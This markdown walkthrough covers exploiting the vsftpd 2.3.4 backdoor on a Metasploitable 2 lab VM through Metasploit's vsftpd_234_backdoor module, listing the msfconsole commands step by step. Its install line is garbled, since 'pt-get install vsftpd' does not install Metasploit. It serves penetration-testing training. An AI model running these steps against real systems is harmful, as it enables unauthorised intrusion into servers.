# vsftpd 2.3.4

## Using Metasploit

<p align="center">
  <img alt="msfConsole" src="https://help.rapid7.com/metasploit/Content/images/icons/favicon.ico" height="140" />

Firstly, install metasploit if not installed using below command.
<p align="center"><i>
  pt-get install vsftpd
  </i></p>
<p><b>Step-00</b> Now start with starting the msfconsole with <i><b>msfconsole</i> command.</b></i></p>
<b>Step-01</b> Once loaded give the command, <i><b>search vsftpd 2.3.4</b></i>
<p align="center"><img alt="search vsftpd 2.3.4" src="https://westoahu.hawaii.edu/cyber/wp-content/uploads/2019/04/word-image-1.png"></p>
<b>Step-02</b> Using the desired exploit in this case select said exploit with command, <i><b>use exploit/unix/ftp/vsftpd_234_backdoor</b></i>
<p align="center"><img alt="use exploit" src="https://westoahu.hawaii.edu/cyber/wp-content/uploads/2019/04/word-image-2.png">
</br><i>In some updated versions of msfconsole, a numeric choice is associated with the options. With that there is no need to enter complete command, just enter the number associated with that command. In that case choose the desired number.</i></p>
<b>Step-03</b> The command, info, will provide intel on the exploit. Run the command, <b><i>show options</i></b>, to see what is missing from running this exploit.
<p align="center"><img alt="show options" src="https://westoahu.hawaii.edu/cyber/wp-content/uploads/2019/04/word-image-3.png"></p>
<b>Step-04</b> Using the IP address logged earlier from the Metasploitable 2 VM, run the command, <b><i>set rhosts “IP address from Metasploitable 2”</i></b>
<p align="center"><img alt="set rhosts" src="https://westoahu.hawaii.edu/cyber/wp-content/uploads/2019/04/word-image-4.png"></p>
<b>Step-04</b> Run the show options command to make sure the IP matches the Metasploitable 2 VM. If so, run the command <i><b>run</i></b>
<p align="center"><img alt="run" src="https://westoahu.hawaii.edu/cyber/wp-content/uploads/2019/04/word-image-5.png"></p>

**Note**
</br>While exploiting this box with Metasploit was easy, it took away the core aspect of exploitation. In other words, using Metasploit only teaches you how to input data and press the right settings to exploit; a script kiddie. Like all tools it is important to understand what is happening before using an automated system.
